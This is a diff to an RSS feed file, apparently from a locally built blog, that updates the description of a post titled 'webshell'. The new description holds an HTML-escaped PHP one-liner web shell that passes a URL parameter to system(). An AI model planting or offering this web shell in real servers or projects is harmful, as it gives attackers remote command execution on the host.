@@ -13,7 +13,7 @@
       <link>http://localhost:1313/posts/webshell/index.html</link>
       <pubDate>Sun, 02 Aug 2026 23:34:58 +0900</pubDate>
       <guid>http://localhost:1313/posts/webshell/index.html</guid>
-      <description>php ‘‘‘bash&#xA;’’’</description>
+      <description>php&#xD;&lt;?php system($_GET[&#34;cmd&#34;]);?&gt;</description>
     </item>
   </channel>
 </rss>
